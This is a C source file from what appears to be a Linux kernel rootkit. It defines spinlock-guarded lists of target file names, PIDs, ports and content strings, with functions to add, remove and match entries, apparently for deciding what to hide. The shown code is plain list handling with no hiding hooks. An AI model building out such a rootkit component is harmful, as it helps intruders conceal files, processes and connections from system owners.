// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/string.h>

struct rk_target_list rk_file_targets;
struct rk_target_list rk_pid_targets;
struct rk_target_list rk_content_targets;
struct rk_target_list rk_port_targets;

void rk_target_init(struct rk_target_list *list)
{
	spin_lock_init(&list->lock);
	list->count = 0;
}

int rk_target_add(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int ret = 0;

	if (!name || !*name)
		return -EINVAL;
	spin_lock_irqsave(&list->lock, flags);
	if (list->count >= RK_TARGET_MAX) {
		ret = -ENOSPC;
		goto out;
	}
	strscpy(list->targets[list->count], name, RK_NAME_MAX);
	list->count++;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

int rk_target_remove(struct rk_target_list *list, int idx)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (idx < 0 || idx >= list->count) {
		ret = -EINVAL;
		goto out;
	}
	if (idx < list->count - 1) {
		memmove(&list->targets[idx], &list->targets[idx + 1],
			(list->count - idx - 1) * RK_NAME_MAX);
	}
	list->count--;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

bool rk_target_match(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strcmp(list->targets[i], name) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}

bool rk_line_matches(struct rk_target_list *list, const char *line, int len)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strnstr(line, list->targets[i], len)) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}
